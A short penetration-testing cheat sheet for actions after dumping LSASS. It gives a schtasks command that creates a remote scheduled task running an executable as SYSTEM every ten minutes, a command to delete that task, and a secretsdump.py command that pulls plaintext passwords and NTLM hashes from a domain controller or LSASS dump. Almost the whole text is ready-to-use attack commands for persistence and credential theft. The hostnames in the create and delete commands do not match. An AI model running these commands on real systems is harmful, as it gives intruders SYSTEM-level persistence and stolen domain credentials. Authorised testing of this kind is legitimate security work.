### **Pentest Note: Post-LSASS Dump Actions**

---

#### **Task Scheduling with schtasks**

**Create a Scheduled Task:**
- **Command:**
  ```bash
  schtasks /S S0.P.COM /create /sc minute /mo 10 /tn "pentest task" /tr C:\Migration\jconsole.exe /ru "SYSTEM"
  ```
  - **Use Case:** Schedules a task on the remote system `S0.P.COM` to run every 10 minutes as the `SYSTEM` user, executing `jconsole.exe` from the `C:\Migration` directory.

**Delete a Scheduled Task:**
- **Command:**
  ```bash
  schtasks /S S10.ABCDGLB.COM /delete /tn "pentest task" /f
  ```
  - **Use Case:** Deletes the previously created scheduled task ned "pentest task" on the remote system `S10.ABCDGLB.COM`.

---

#### **Decrypting Hashes with SecretsDump**

**SecretsDump Decryption:**
- **Command:**
  ```bash
  secretsdump.py <domain>/<user>:<password>@<target_ip>
  ```
  - **Use Case:** Decrypts and extracts credentials from an LSASS dump or directly from a Domain Controller using `secretsdump.py`. This tool is used to obtain plaintext passwords, NTLM hashes, and other sensitive data.
